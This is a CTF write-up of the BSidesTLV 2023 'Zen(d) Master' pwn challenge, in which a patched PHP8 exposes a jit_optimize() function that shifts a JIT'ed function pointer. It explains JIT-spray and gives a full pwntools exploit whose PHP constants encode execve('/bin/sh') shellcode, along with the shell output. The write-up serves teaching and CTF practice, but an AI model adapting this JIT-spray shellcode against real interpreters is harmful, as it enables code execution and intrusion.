@@ -1,0 +1,328 @@
+
+BsidesTLV 2023 - 'Zen(d) Master' writeup (pwn)
+Home
+Blog
+Projects
+About
+Search
+Search
+Dark mode
+Light mode
+Home
+ ❯ 
+ctf writeups
+ ❯ 
+BsidesTLV 2023 - 'Zen(d) Master' writeup (pwn)
+BsidesTLV 2023 - 'Zen(d) Master' writeup (pwn)
+Jun 01, 2023
+interpreters
+ctf
+pwn
+zned
+php
+jit-engine
+This year, I had the honour to write some challenges for the BSidesTLV conference :^) This is my third time in a row, nice
+Interested in JIT Compilers and funky allocator implementations?
+Try my challenges at 
+@BSidesTLV_CTF
+gl hf :^) 
+pic.twitter.com/fpedEv2iUA
+— faulty *ptrrr (@0x_shaq) 
+June 26, 2023
+All the challenge files can be found 
+here
+.
+Challenge Description
+You are getting a tar archive with:
+.patch
+ files: 
+pwn1.patch
+ and 
+pwn2.patch
+An entire setup and compiles PHP with the patches applied(
+Dockerfile
+)
+a php ini configuration file that basically disables every possible function in PHP: 
+conf.ini
+A 
+server.py
+ file that gets your input and run arbitrary PHP code(+with the 
+.ini
+ configs applied).
+The 
+.patch
+ files introduce a new function for the PHP8 interpreter called 
+jit_optimize()
+, it accepts two parameters: a function name and an offset.
+The new function takes the offset you provide(2nd parameter) and adds that to the JIT’ed trace function pointer:
+pwn1.patch:59
+		if
+(cur_func_name 
+!=
+ NULL
+ &&
+ strcmp
+(
+ZSTR_VAL
+(cur_func_name), 
+ZSTR_VAL
+(arg_func_name)) 
+==
+ 0
+) {
+			printf
+(
+"[+] Found! 
+\n\t
+arg_func_name=
+%s\n\t
+func_name=
+%s\n\t
+addr=
+%p\n\n
+"
+, 
+ZSTR_VAL
+(arg_func_name), 
+ZSTR_VAL
+(cur_func_name), cur_trace->code_start);
+			found 
+=
+ 1
+;
+			printf
+(
+"[~] Optimizing JIT'ed func/trace...
+\n
+"
+);
+			cur_trace->code_start 
++=
+ offset;
+			((zend_op
+*
+)cur_trace->opline)->handler 
++=
+ offset;
+ // <---- here 
+			printf
+(
+"[+] Done! new addr @ 
+%p\n
+"
+, cur_trace->code_start);
+			break
+;
+		}
+Before we dive into the solution, and the explanation of what this primitive gives us: we need to talk briefly about what ‘
+JIT-Spray
+’ is.
+JIT-Spray for Dummies
+In many interpreters, the JIT Compiler produces assembly instructions with 
+immediate values
+. Usually, those immediate values can be derived from constants in your script. To make it more clear, here’s an example from LuaJIT
+[1]
+.
+function
+ lol
+()
+    local
+ tbl 
+=
+ {}
+    for
+ i
+=
+0
+, 
+100
+, 
+1
+ do
+    tbl[
+2261634.5098039214
+] 
+=
+ 0
+        -- Key: 0x4141414141414141
+	tbl[
+156842099844.51764
+] 
+=
+ 0
+        -- Key: 0x4242424242424242
+	tbl[
+1.0843961455707782e
++
+16
+] 
+=
+ 0
+    -- Key: 0x4343434343434343
+	tbl[
+7.477080264543605e
++
+20
+] 
+=
+ 0
+     -- Key: 0x4444444444444444
+	tbl[
+5.142912663207646e
++
+25
+] 
+=
+ 0
+     -- Key: 0x4545454545454545
+    end
+end
+lol
+()
+Those index specifiers(
+tbl[some_constant]
+) turns into immediate values when the JIT Engine compiles them to native assembly:
+This is the same snippet but in a hexdump view:
+Now I just want to remind you that:
+This(in red) is a user-controlled data
+We’re looking at an executable page
+In other words, we can:
+Spray constants that will be used as an arbitrary shellcode(tiny shellcodes with jumps in between, because every constant is a 7-8 bytes long with garbage instructions between them)
+Chain this with another memory corruption bug to make the JIT’ed function pointer point to the middle of the function and not to the beginning(it should point where our 
+0x414141...
+ starts).
+The spraying technique can be different for each interpreter. In LuaJIT(above) we are using the index specifier syntax(
+tbl[some_index]
+). And in PHP8, we can use the 
+==
+ operator, as we will see below.
+Solution
+You’re getting a very powerful primitive to modify a function pointer of a JIT’ed trace. To leverage that, you spray constants that will later be part of an immediate asm instruction/immediate value(after compilation). Those constants, in conjunction with the primitive the challenge gives you, can turn into arbitrary shellcode execution(tiny shellcodes with jumps in between, because every constant is a 7-8 bytes long with garbage instructions between them). You just need to provide an offset that will point to the 
+middle of the generated assembly
+ and not to the beginning(middle==where your constants begin). You provide this offset to the 
+jit_optimize()
+ function
+#!/usr/bin/python3
+from
+ pwn 
+import
+ *
+HOST
+ =
+ 'zend-master.ctf.bsidestlv.com'
+PORT
+ =
+ 1337
+# JIT-spray let's goooooo
+payload 
+=
+  "<?php"
+payload 
++=
+ " function hot($i) {"
+payload 
++=
+ "   if($i == 0x0C_EB_90_50_C0_31_48) { return 0 ; } "
+ # xor rax, rax; push rax; nop; jmp
+payload 
++=
+ "   if($i == 0x0C_EB_90_90_90_90_50) { return 0 ; } "
+ # push rax; nop; nop; nop; nop; jmp
+payload 
++=
+ "   if($i == 0x0C_EB_90_2F_24_04_C6) { return 0 ; } "
+ # mov byte ptr [rsp], '/'; nop; jmp
+payload 
++=
+ "   if($i == 0x0C_EB_62_01_24_44_C6) { return 0 ; } "
+ # mov byte ptr [rsp+0x1], 'b'; jmp
+payload 
++=
+ "   if($i == 0x0C_EB_69_02_24_44_C6) { return 0 ; } "
+ # mov byte ptr [rsp+0x2], 'i'; jmp
+payload 
++=
+ "   if($i == 0x0C_EB_6E_03_24_44_C6) { return 0 ; } "
+ # mov byte ptr [rsp+0x3], 'n'; jmp
+payload 
++=
+ "   if($i == 0x0C_EB_2F_04_24_44_C6) { return 0 ; } "
+ # mov byte ptr [rsp+0x4], '/'; jmp
+payload 
++=
+ "   if($i == 0x0C_EB_73_05_24_44_C6) { return 0 ; } "
+ # mov byte ptr [rsp+0x5], 's'; jmp
+payload 
++=
+ "   if($i == 0x0C_EB_68_06_24_44_C6) { return 0 ; } "
+ # mov byte ptr [rsp+0x6], 'h'; jmp
+payload 
++=
+ "   if($i == 0x0C_EB_00_07_24_44_C6) { return 0 ; } "
+ # mov byte ptr [rsp+0x7], 0x00; jmp
+payload 
++=
+ "   if($i == 0x0C_EB_58_3B_6A_5F_54) { return 0 ; } "
+ # push rsp; pop rdi; push 0x3b; pop rax; jmp
+payload 
++=
+ "   if($i == 0x0C_EB_F6_31_48_90_90) { return 0 ; } "
+ # nop; nop; xor rsi, rsi; jmp
+payload 
++=
+ "   if($i == 0x90_90_90_05_0F_99_90) { return 0 ; } "
+ # nop; cdq; syscall; nop; nop; nop
+payload 
++=
+ " } "
+payload 
++=
+ " for( $i=0; $i<1000; $i++) {  "
+payload 
++=
+ "     hot($i); "
+payload 
++=
+ " } "
+payload 
++=
+ " jit_optimize('hot', 0x21); "
+ # modify the function pointer
+payload 
++=
+ " hot(1337); "
+ # pop a shell
+payload 
++=
+ " ?> "
+client 
+=
+ remote(
+HOST
+, 
+PORT
+)
+client.recvline()
+client.sendline(payload.encode())
+client.interactive()
+output:
+[+] Opening connection to zend-master.ctf.bsidestlv.com on port 1337: Done
+[*] Switching to interactive mode
+[+] Found! 
+    arg_func_name=hot
+    func_name=hot
+    addr=0x496f49e0
+[~] Optimizing JIT'ed func/trace...
+[+] Done! new addr @ 0x496f4a01
+$ ls
+conf.ini  flag.txt  sanity-tests.py  server.py
+$ cat flag.txt
+BSidesTLV2023{only-the-dragon-warrior-can-jit-spray-like-this}
+Graph View
+Backlinks
+No backlinks found
+Created with 
+Quartz v4.4.0
+ © 2026
+GitHub
+Twitter/X
